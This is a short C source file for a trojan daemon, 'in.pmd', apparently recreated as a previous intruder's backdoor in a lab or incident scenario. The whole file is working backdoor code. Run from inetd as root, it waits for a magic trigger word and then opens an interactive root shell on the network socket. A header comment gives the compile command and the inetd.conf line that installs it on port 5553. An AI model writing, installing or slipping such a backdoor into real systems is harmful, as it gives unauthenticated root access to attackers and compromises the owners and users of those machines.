/*
 * in.pmd  --  "port monitor daemon".  Berkeley Underground, Box 4 backdoor.
 *
 * The prior intruder's persistence: a trojan daemon wired to inetd on a high port
 * and run as root.  The first line that arrives on the connection is checked
 * against the magic word; on a match it opens a root shell on the socket (inetd
 * has already dup'd the socket onto stdin/stdout/stderr, and the service runs as
 * root, so the shell is root).  Anything else: silent disconnect.
 *
 * cf ~/takedown TIMELINE 4007 -- 'sportd' renamed to 'in.pmd', launched from
 * inetd on port 5553, trigger word 'wank'.
 *
 *   cc -DMAGIC='"wank"' -o in.pmd in.pmd.c
 *   inetd.conf:  pmd stream tcp nowait root /usr/libexec/in.pmd in.pmd
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#ifndef MAGIC
#define MAGIC "wank"
#endif

int main(int argc, char **argv)
{
	char buf[256];
	int n = 0, i, ml = strlen(MAGIC);
	char c;

	/* Read EXACTLY the first line (the knock), byte-by-byte up to the newline,
	 * and stop there.  A client like telnet prepends IAC option-negotiation
	 * bytes, so memcmp-scan the line for the magic word anywhere (binary/NUL-
	 * tolerant).  Crucially, we consume only this one line — anything the client
	 * sends AFTER the newline stays in the socket for the shell we exec, so the
	 * attacker's follow-on commands aren't swallowed (a buffered read would eat a
	 * variable amount of them depending on TCP packet boundaries). */
	while (n < (int)sizeof buf - 1) {
		if (read(0, &c, 1) != 1)
			break;
		if (c == '\n')
			break;
		buf[n++] = c;
	}
	for (i = 0; i + ml <= n; i++)
		if (memcmp(buf + i, MAGIC, ml) == 0) {
			execl("/bin/sh", "sh", "-i", (char *)NULL);
			perror("in.pmd: exec");
			return 1;
		}
	return 0;
}
